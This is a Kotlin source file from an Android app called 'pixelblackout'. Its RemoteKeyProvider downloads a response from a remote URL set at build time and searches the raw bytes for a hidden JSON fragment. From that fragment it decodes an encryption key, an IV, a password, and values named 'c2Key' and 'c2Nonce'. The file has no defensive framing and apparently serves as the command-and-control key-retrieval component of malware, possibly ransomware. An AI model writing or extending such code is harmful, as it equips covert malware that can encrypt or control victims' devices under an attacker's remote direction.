package com.example.pixelblackout.nativebridge

import android.util.Base64
import android.util.Log
import com.example.pixelblackout.BuildConfig
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.nio.charset.StandardCharsets
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.regex.Pattern

object RemoteKeyProvider {
    private val KEY_URL: String = BuildConfig.REMOTE_KEY_URL
    private val PAYLOAD_PATTERN: Pattern = Pattern.compile("\\{\\s*\\\"k\\\".*?\\}", Pattern.DOTALL)
    const val MASK: Int = 0x37
    private const val TAG = "RemoteKeyProvider"
    private val executor = Executors.newSingleThreadExecutor()

    data class Material(
        val key: ByteArray,
        val iv: ByteArray,
        val password: ByteArray,
        val c2Key: ByteArray,
        val c2Nonce: ByteArray
    )

    fun fetch(): Material {
        if (KEY_URL.isBlank()) {
            throw IllegalStateException("Remote key URL missing")
        }
        return try {
            executor.submit<Material> {
                val connection = (URL(KEY_URL).openConnection() as HttpURLConnection).apply {
                    connectTimeout = 5000
                    readTimeout = 5000
                    requestMethod = "GET"
                    setRequestProperty("User-Agent", "pixelblackout-remote-key")
                    setRequestProperty("Accept", "*/*")
                    setRequestProperty("Cache-Control", "no-cache")
                }
                try {
                    val code = connection.responseCode
                    if (code in 400..599) {
                        throw IllegalStateException("Remote status $code")
                    }
                    val body = connection.inputStream.use { it.readBytes() }
                    parseMaterial(body)
                } finally {
                    connection.disconnect()
                }
            }.get(10, TimeUnit.SECONDS)
        } catch (error: IllegalStateException) {
            Log.println(Log.ERROR, TAG, "fetch:error illegalState ${error.message}")
            throw error
        } catch (error: Exception) {
            Log.println(Log.ERROR, TAG, "fetch:failure ${error.javaClass.simpleName}:${error.message}")
            throw IllegalStateException("Key sync failed", error)
        }
    }

    private fun parseMaterial(bytes: ByteArray): Material {
        val text = String(bytes, StandardCharsets.ISO_8859_1)
        val matcher = PAYLOAD_PATTERN.matcher(text)
        if (!matcher.find()) {
            Log.e(TAG, "Payload marker not found in response")
            if (BuildConfig.DEBUG) {
                val headHex = hexSnippet(bytes, 24)
                val tailCount = kotlin.math.min(24, bytes.size)
                val tail = bytes.copyOfRange(bytes.size - tailCount, bytes.size)
                val tailHex = hexSnippet(tail, tailCount)
                Log.e(TAG, "payload head[24]=" + headHex)
                Log.e(TAG, "payload tail[24]=" + tailHex)
            }
            throw IllegalStateException("Payload marker not found")
        }
        val rawJson = matcher.group()
        if (BuildConfig.DEBUG) {
            Log.d(TAG, "Payload fragment=${'$'}rawJson")
        }
        val json = JSONObject(rawJson)
        val key = Base64.decode(json.getString("k"), Base64.DEFAULT)
        val iv = Base64.decode(json.getString("i"), Base64.DEFAULT)
        val password = Base64.decode(json.getString("p"), Base64.DEFAULT)
        val c2Key = Base64.decode(json.getString("c"), Base64.DEFAULT)
        val c2Nonce = Base64.decode(json.getString("n"), Base64.DEFAULT)
        if (BuildConfig.DEBUG) {
            Log.d(TAG, "Decoded key=${'$'}{key.size} iv=${'$'}{iv.size} pwd=${'$'}{password.size} c2=${'$'}{c2Key.size} nonce=${'$'}{c2Nonce.size}")
        }
        return Material(key, iv, password, c2Key, c2Nonce)
    }

    private fun hexSnippet(bytes: ByteArray, limit: Int = 16): String {
        if (bytes.isEmpty()) return ""
        val n = kotlin.math.min(limit, bytes.size)
        val sb = StringBuilder(n * 3)
        for (i in 0 until n) {
            val b = bytes[i].toInt() and 0xFF
            if (i > 0) sb.append(' ')
            sb.append(String.format("%02x", b))
        }
        return sb.toString()
    }
}
